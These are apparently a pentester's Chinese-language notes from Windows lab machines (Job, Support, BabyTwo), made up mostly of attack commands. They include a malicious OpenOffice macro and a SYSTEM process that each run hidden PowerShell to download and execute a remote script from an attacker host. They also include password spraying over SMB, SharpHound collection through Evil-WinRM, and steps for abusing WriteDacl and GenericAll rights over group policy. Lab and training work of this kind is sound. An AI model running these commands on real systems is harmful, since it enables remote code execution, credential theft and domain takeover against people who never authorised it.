## Windows

```
[★]$ msfconsole //官方文件总是消失的命令
```
```
[★]$ nxc smb 10.129.234.72 -u users.txt -p users.txt --no-bruteforce --continue-on-success //同行配对--no-bruteforce
```
————————————————————————————————————
### 总结 一样命令的区别 form Job
#### PowerShell 反向 shell 文件
https://amanutkhedkar.medium.com/powershell-reverse-shell-via-social-engineering-toolkit-591ca034a12d
#### 第一条：让“受害文档里的宏代码”去执行 PowerShell
```
msf6 exploit(multi/misc/openoffice_document_macro) > set cmd "powershell.exe -nop -w hidden -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.86/shell.txt');" 
```
#### 第二条：让“已经提权成功的 SYSTEM 进程（god.exe）”去执行 PowerShell
```
c:\ProgramData>.\god.exe -cmd "powershell.exe -nop -w hidden -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.txt');"
```
————————————————————————————————————
#### BloodHound form Support 
```
[★]$ sudo neo4j start
https://github.com/SpecterOps/BloodHound-Legacy/releases
[★]$ unzip BloodHound-linux-x64.zip

从远程收集数据在我们继续之前。为此，让我们继续在本地克隆BloodHound GitHub项目https://github.com/SpecterOps/BloodHound-Legacy
[★]$ git clone https://github.com/BloodHoundAD/BloodHound
[★]$ ls BloodHound/Collectors/
AzureHound.md  DebugBuilds  SharpHound.exe  SharpHound.ps1

*Evil-WinRM* PS C:\Users\support\Documents> upload SharpHound.exe
*Evil-WinRM* PS C:\Users\support\Documents> ./SharpHound.exe
得到20260131001204_BloodHound.zip 
导入到 
[~/Downloads/BloodHound-linux-x64][★]$ ./BloodHound --no-sandbox --disable-gpu
```
————————————————————————————————————
#### About WriteDacl--PowerView.ps1 && GenericAll--pyGPOAbuse From BabyTwo
```
工具 revshells.com; 选择PowerShell #3(Base64);Base64 编码的 UTF-16LE PowerShell 脚本

$ bloodhound
//从 Windows 中滥用“写 DACL”访问控制列表:(WriteDacl 使用PowerView.ps1 )
//Amelia Griffiths -> MemberOf -> LEGACY@BABY2.VL -> WriteDacl -> GPOADM@BABY2.VL,GPO-MANAGEMENT@BABY2.VL
https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
[★]$ wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/master/Recon/PowerView.ps1

// 通过组策略对象来滥用通用所有访问控制列表（GenericAll ACL），请使用 pyGPOAbuse。
// GPOADM@BABY2.VL -> GenericAll -> 蓝色文档方块 2个
// GPOADM@BABY2.VL -> Contains -> GPO-MANAGEMENT@BABY2.VL -> Contains -> BABY2.VL -> GPLink -> 蓝色文档方块(GPO Fine Path: \\BABY2.VL\SYSVOL\BABY2.VL\POLICIES\{31B2340-016D-11D2-945F-00C04FB984F9}
https://github.com/Hackndo/pyGPOAbuse

PS C:\Users\amelia.griffiths> gpupdate
```
————————————————————————————————————
